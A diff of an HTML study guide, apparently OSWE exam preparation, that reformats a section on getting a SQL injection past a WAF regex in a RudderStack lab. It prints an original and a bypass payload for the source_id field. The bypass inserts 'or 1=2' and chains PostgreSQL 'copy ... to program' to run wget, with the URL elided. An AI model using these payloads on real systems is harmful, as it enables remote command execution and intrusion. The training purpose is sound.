@@ -7838,14 +7838,21 @@ SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAME
 <h4 id="oswe-rudderstack-waf-bypass-technique">14.6.6 Crafting the Bypass</h4>
 <p>The bypass separates the single quote from the semicolon by inserting a valid SQL expression between them. Adding <code>or 1=2</code> after the closing quote and before the semicolon prevents the regex from matching, because the quote is no longer immediately followed by whitespace and a semicolon. The injected expression must be valid SQL to avoid syntax errors.</p>
 
-<ul class="methodology-checklist">
-  <li><label><input type="checkbox"> Original payload (BLOCKED by WAF):</label></li>
-  <li><label><input type="checkbox"> source_id: '; copy (select 'a') to program 'wget ...' -- -</label></li>
-  <li><label><input type="checkbox"> ^--- quote immediately followed by semicolon</label></li>
-  <li><label><input type="checkbox"> Bypass payload (EVADES WAF):</label></li>
-  <li><label><input type="checkbox"> source_id: ' or 1=2; copy (select 'a') to program 'wget ...' -- -</label></li>
-  <li><label><input type="checkbox"> ^--- quote followed by "or 1=2" then semicolon</label></li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Payload</th><th>source_id Value</th><th>WAF Behavior</th></tr></thead>
+<tbody>
+<tr>
+  <td>Original</td>
+  <td><code>'; copy (select 'a') to program 'wget ...' -- -</code></td>
+  <td>Blocked because the closing quote is followed directly by a semicolon.</td>
+</tr>
+<tr>
+  <td>Bypass</td>
+  <td><code>' or 1=2; copy (select 'a') to program 'wget ...' -- -</code></td>
+  <td>Allowed because <code>or 1=2</code> separates the quote from the semicolon while preserving valid SQL syntax.</td>
+</tr>
+</tbody>
+</table>
 
 <p>Test the regex against both payloads on regex101.com before sending. The original payload <code>';</code> matches the regex pattern; the bypass <code>' or 1=2;</code> does not match because <code>or 1=2</code> separates the quote from the semicolon.</p>
 
